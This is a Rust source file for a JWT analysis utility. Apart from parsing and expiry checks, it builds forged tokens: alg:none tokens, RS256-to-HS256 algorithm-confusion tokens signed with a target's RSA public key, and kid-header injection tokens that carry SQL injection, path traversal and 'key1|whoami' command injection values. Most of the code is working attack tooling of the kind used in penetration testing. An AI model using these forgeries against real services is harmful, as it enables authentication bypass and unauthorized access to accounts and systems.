//! JWT Analysis & Manipulation Utility
//!
//! Provides cryptographic JWT parsing, expiration audits, alg:none attack generation,
//! real RS256 -> HS256 algorithm confusion with RSA public key byte signing, and
//! kid header injection vectors (SQLi, path traversal, command injection).

use base64::engine::general_purpose::URL_SAFE_NO_PAD;
use base64::Engine;
use chrono::Utc;
use serde_json::Value;
use sha2::{Digest, Sha256};

#[derive(Debug, Clone)]
pub struct ParsedJwt {
    pub header: Value,
    pub payload: Value,
    pub signature: String,
    pub raw_header_b64: String,
    pub raw_payload_b64: String,
}

pub struct JwtUtility;

impl JwtUtility {
    /// Computes RFC 2104 compliant HMAC-SHA256 digest
    pub fn hmac_sha256(key: &[u8], data: &[u8]) -> Vec<u8> {
        let block_size = 64usize;
        let mut key_block = [0u8; 64];

        if key.len() > block_size {
            let mut hasher = Sha256::new();
            hasher.update(key);
            let result = hasher.finalize();
            key_block[..32].copy_from_slice(&result);
        } else {
            key_block[..key.len()].copy_from_slice(key);
        }

        let mut ipad = [0x36u8; 64];
        let mut opad = [0x5cu8; 64];

        for i in 0..64 {
            ipad[i] ^= key_block[i];
            opad[i] ^= key_block[i];
        }

        // Inner hash: H(ipad || data)
        let mut inner_hasher = Sha256::new();
        inner_hasher.update(ipad);
        inner_hasher.update(data);
        let inner_hash = inner_hasher.finalize();

        // Outer hash: H(opad || inner_hash)
        let mut outer_hasher = Sha256::new();
        outer_hasher.update(opad);
        outer_hasher.update(inner_hash);
        outer_hasher.finalize().to_vec()
    }

    pub fn parse(jwt_str: &str) -> Option<ParsedJwt> {
        let parts: Vec<&str> = jwt_str.split('.').collect();
        if parts.len() != 3 {
            return None;
        }

        let header_bytes = URL_SAFE_NO_PAD.decode(parts[0]).ok()?;
        let payload_bytes = URL_SAFE_NO_PAD.decode(parts[1]).ok()?;

        let header: Value = serde_json::from_slice(&header_bytes).ok()?;
        let payload: Value = serde_json::from_slice(&payload_bytes).ok()?;

        Some(ParsedJwt {
            header,
            payload,
            signature: parts[2].to_string(),
            raw_header_b64: parts[0].to_string(),
            raw_payload_b64: parts[1].to_string(),
        })
    }

    pub fn is_expired(jwt_str: &str) -> bool {
        if let Some(parsed) = Self::parse(jwt_str) {
            if let Some(exp) = parsed.payload.get("exp").and_then(|e| e.as_i64()) {
                return exp < Utc::now().timestamp();
            }
        }
        false
    }

    pub fn create_none_algorithm_attack(jwt_str: &str) -> Option<String> {
        let mut parsed = Self::parse(jwt_str)?;
        if let Some(map) = parsed.header.as_object_mut() {
            map.insert("alg".to_string(), Value::String("none".to_string()));
        }

        let header_json = serde_json::to_vec(&parsed.header).ok()?;
        let new_header_b64 = URL_SAFE_NO_PAD.encode(header_json);

        Some(format!("{}.{}.", new_header_b64, parsed.raw_payload_b64))
    }

    /// Real RS256 -> HS256 Algorithm Confusion:
    /// Re-signs the JWT with HS256 using the target server's raw RSA Public Key PEM/DER bytes as secret.
    pub fn create_key_confusion_attack(jwt_str: &str, rsa_public_key_bytes: &[u8]) -> Option<String> {
        let mut parsed = Self::parse(jwt_str)?;
        if let Some(map) = parsed.header.as_object_mut() {
            map.insert("alg".to_string(), Value::String("HS256".to_string()));
        }

        let header_json = serde_json::to_vec(&parsed.header).ok()?;
        let new_header_b64 = URL_SAFE_NO_PAD.encode(header_json);

        let signing_input = format!("{}.{}", new_header_b64, parsed.raw_payload_b64);
        let signature_bytes = Self::hmac_sha256(rsa_public_key_bytes, signing_input.as_bytes());
        let signature_b64 = URL_SAFE_NO_PAD.encode(signature_bytes);

        Some(format!("{}.{}", signing_input, signature_b64))
    }

    /// Generates kid header parameter injection payloads (SQLi, path traversal, command injection)
    pub fn create_kid_injection_payloads(jwt_str: &str) -> Vec<String> {
        let mut attacks = Vec::new();
        let kid_vectors = vec![
            ("sqli_union", "' UNION SELECT 'sentinel_secret' --", b"sentinel_secret".as_slice()),
            ("path_traversal_null", "../../../../../dev/null", b"".as_slice()),
            ("cmdi_echo", "key1|whoami", b"key1|whoami".as_slice()),
        ];

        for (_name, kid_val, secret) in kid_vectors {
            if let Some(mut parsed) = Self::parse(jwt_str) {
                if let Some(map) = parsed.header.as_object_mut() {
                    map.insert("alg".to_string(), Value::String("HS256".to_string()));
                    map.insert("kid".to_string(), Value::String(kid_val.to_string()));
                }

                if let Ok(header_json) = serde_json::to_vec(&parsed.header) {
                    let new_header_b64 = URL_SAFE_NO_PAD.encode(header_json);
                    let signing_input = format!("{}.{}", new_header_b64, parsed.raw_payload_b64);
                    let sig_bytes = Self::hmac_sha256(secret, signing_input.as_bytes());
                    let sig_b64 = URL_SAFE_NO_PAD.encode(sig_bytes);
                    attacks.push(format!("{}.{}", signing_input, sig_b64));
                }
            }
        }

        attacks
    }
}
